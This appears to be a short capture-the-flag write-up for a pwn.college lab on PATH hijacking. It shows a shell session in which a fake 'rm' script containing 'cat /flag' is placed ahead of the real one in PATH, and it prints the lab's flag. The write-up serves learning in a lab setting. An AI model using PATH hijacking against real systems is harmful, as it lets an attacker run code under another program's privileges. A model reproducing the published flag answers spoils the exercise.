# Challenge Description
Armed with your knowledge, you can now carry out some shenanigans. This challenge is almost the same as the first challenge in this module. Again, this challenge will delete the flag using the rm command. But unlike before, it will not print anything out for you.

How can you solve this? You know that rm is searched for in the directories listed in the PATH variable. You have experience creating the win command when the previous challenge needed it. What else can you create?
# Thought Process & Solution

```bash
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ echo $PATH
/run/challenge/bin:/run/dojo/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~hijacking-commands:~$ PATH="/home/hacker:$PATH"
hacker@path~hijacking-commands:~$ echo $PATH
/home/hacker:/run/challenge/bin:/run/dojo/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{UXbI07XzhYam-6uhBPgJFsH9Wch.ddzNyUDL5EzN0czW}
hacker@path~hijacking-commands:~$ cat rm
cat /flag
```
**Flag:** `pwn.college{UXbI07XzhYam-6uhBPgJFsH9Wch.ddzNyUDL5EzN0czW}`
## New Learning
## Reference
